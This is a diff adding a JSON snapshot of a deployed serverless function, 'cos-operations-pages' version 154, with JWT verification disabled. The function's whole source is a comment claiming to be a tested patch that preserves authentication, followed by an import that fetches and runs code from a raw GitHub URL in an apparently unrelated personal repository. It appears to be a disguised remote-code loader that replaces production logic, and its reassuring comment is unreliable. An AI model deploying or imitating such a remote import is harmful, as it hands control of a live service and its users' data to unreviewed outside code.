@@ -1,0 +1,22 @@
+{
+  "capturedAtUtc": "2026-11-07T07:30:12.473Z",
+  "projectId": "tughscoxralhofrckvxy",
+  "name": "cos-operations-pages",
+  "version": 154,
+  "status": "ACTIVE",
+  "archiveSha256": "254594ed3300a84e9d5b1bc58afffb5ff1698d04fd3bf5c4c2d01d1018bb6d31",
+  "verifyJwt": false,
+  "importMap": true,
+  "files": [
+    {
+      "name": "index.ts",
+      "sha256": "e50c4343f28019ead7919574ac092807c1dd722ef0827f12ac1c7f069dd11e38",
+      "content": "// Immutable, tested patch of the recorded production v153 artifact.\n// Preserves the application's existing authentication and all unrelated routes.\nimport \"https://raw.githubusercontent.com/cypressriveroasis2023-sudo/neon-oasis-game/baf1418c6884e90cb9e9dd457b2f91dd7aafa8c0/tech-checks/docs/fleet-provenance-repair-20261104/source/serve.ts\";\n"
+    },
+    {
+      "name": "deno.json",
+      "sha256": "c9c2133a7e174b1092ba12c48275ffebf3f904562cb057072fb01f359e9ca1be",
+      "content": "{\"nodeModulesDir\":\"auto\",\"imports\":{\"jose\":\"npm:jose@6.2.12\"}}\n"
+    }
+  ]
+}
